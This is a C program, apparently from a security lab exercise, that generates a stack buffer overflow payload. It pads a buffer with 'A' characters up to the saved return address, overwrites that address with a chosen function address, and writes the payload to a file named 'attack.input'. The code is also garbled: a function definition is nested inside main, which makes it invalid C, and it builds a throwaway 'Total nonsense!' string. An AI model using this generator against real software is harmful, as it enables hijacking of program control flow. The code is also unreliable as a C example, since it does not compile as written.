#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>



int main(int argc, char* argv[]) {
    // Check if command-line arguments are provided correctly
    if(argc < 4) {
        fprintf(stderr, "Usage: %s <function_addr> <buffer_addr> <return_addr>\n", argv[0]);
        return -1;
    }
    
    // Convert command-line arguments to hexadecimal integers
    uint32_t function_address = (uint32_t) strtoul(argv[1], NULL, 16);
    uint32_t buffer_address = (uint32_t) strtoul(argv[2], NULL, 16);
    uint32_t return_address = (uint32_t) strtoul(argv[3], NULL, 16);


// Function to generate a test string based on the input addresses
char* generate_test_string(uint32_t function_address, uint32_t buffer_address, uint32_t return_address) {
    char* test_string = malloc(256); // Arbitrary length
    sprintf(test_string, "This exploit targets function at %04x, with buffer at %04x, returning to %04x. Total nonsense!", function_address, buffer_address, return_address);
    return test_string;
}

    // Calculate the length of the exploit string
    int string_length = (return_address - buffer_address) + 4;
    // Print information about the addresses and string length
    printf("Function address: %04x, Buffer address: %04x, Return address: %04x, String length: %i\n", function_address, buffer_address, return_address, string_length);
    
    // Convert function address to bytes and print each byte
    unsigned char function_address_bytes[4];
    memcpy(function_address_bytes, &function_address, sizeof(uint32_t));
    for(int i=0; i<4; i++) {
        printf("Byte %i = %02x\n", i, function_address_bytes[i]);
    }

    // Allocate memory for the exploit string and fill it with 'A's
    unsigned char* exploit_string = malloc(string_length);
    memset(exploit_string, 'A', string_length); 
    // Overwrite the last 4 bytes with the function address bytes
    unsigned char* ptr = exploit_string + string_length - 4;
    for(int i=0; i<4; i++) {
        *ptr = function_address_bytes[i];
        ptr++;
    }

    // Create a file to store the exploit input
    FILE* file_ptr = fopen("attack.input", "wb"); 
    if(!file_ptr) {
        // Print error message if file creation fails
        fprintf(stderr, "Failed to create exploit input file.\n"); 
        return -1;
    }
    
    // Write the exploit string to the file
    fwrite(exploit_string, string_length, 1, file_ptr);
    fclose(file_ptr);

    // Print success message
    printf("Exploit input file 'attack.input' created successfully.\n"); 
    
    // For testing purposes, generate a test string and free allocated memory
    char* test_string = generate_test_string(function_address, buffer_address, return_address);
    free(test_string); // Free allocated memory

    return 0;
}

